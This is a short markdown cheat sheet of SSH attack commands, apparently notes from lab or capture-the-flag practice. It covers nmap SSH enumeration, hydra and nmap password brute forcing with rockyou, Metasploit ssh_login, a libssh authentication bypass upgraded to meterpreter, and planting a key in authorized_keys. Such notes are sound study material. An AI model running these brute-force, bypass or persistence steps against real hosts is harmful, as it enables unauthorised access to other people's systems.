# SSH

# Brute Force

- Brute
    
    ```bash
    ssh root@192.201.39.3
    
    nmap --script ssh2-enum-algos 192.201.39.3
    
    nmap --script ssh-hostkey --script-args ssh_hostkey=full 192.201.39.3
    
    nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=student"
    192.201.39.3
    
    nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=admin" 192.201.39.3
    
    nmap -p 22 --script=ssh-run --script-args="ssh-run.cmd=cat /home/student/FLAG,
    ssh-run.username=student,ssh-run.password=" 192.201.39.3
    
    gzip -d /usr/share/wordlists/rockyou.txt.gz
    hydra -l student -P /usr/share/wordlists/rockyou.txt 192.40.231.3 ssh
    
    echo "administrator" > users
    nmap -p 22 --script ssh-brute --script-args userdb=/root/users 192.40.231.3
    
    Metasploit
    
    msfconsole
    use auxiliary/scanner/ssh/ssh_login
    set RHOSTS 192.40.231.3
    set USERPASS_FILE /usr/share/wordlists/metasploit/root_userpass.txt
    set STOP_ON_SUCCESS true
    set verbose true
    exploit
    ```
    

# Exploitation

- Exploitation
    
    ```bash
    Metasploit
    use auxiliary/scanner/ssh/libssh_auth_bypass
    set RHOSTS 192.51.205.3
    set SPAWN_PTY true
    exploit
    ctrl + z
    use post/multi/manage/shell_to_meterpreter
    set lhost 
    set session
    run
    ```
    

# Create local SSH

- SSH-keygen
    
    `ssh-keygen -f paulo`
    
    `cat paulo.pub`
    
    ```
    cat paulo.pub 
    ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDGxrIOhOtb8peuidXlaCJIhELABVkNLTTvGhV/iv8svUOvsjuTfO4kSRY1Lo0pmTdxmDWYnPYG1n1c24Ps1XVHtbpq8+bDjg4jIM13pD/SDdJxAkJ0J3rx1E/ceg+hBG6vQKJ6eAuqIvA/Sy/e3vHcWfoRi/Q/3i3OYIkNrgnSNAEI+Z55sVkn1yb+4HxoIeK2aNErNH4A98lxPOnRGXGkrzWYHH6qBegw16HdfhfzMXOTHVkIfQvtCAhoVdCpJsZs4+OXNYqdBC2zHO5GE7wyxlM1nLly79HfbXYCs61WhkF5zGv33FLNPDPQtHQwcQtzXU8C2GyPYySCzTTSXZ40MrjqirxKyl8txNnC0t69HLYxYRTiRmBcZPvIWLlRMCAWzmyCwGHzdvmza57hmbnSQJqhlTU8hGwvMkMC21kP7dpOVaBr+/Lmbpmb7JvzaBVAqIXFPa6I1LO/Lo40ScYqArFTgjGLDHsrC/grftS85+Vzc+DAX8zY98fTcHxBVPU= paulinho13@htb-sq8gsdgdkf
    ```
    
    `vi authorized_keys`
    
    `chmod 600 authorized_keys`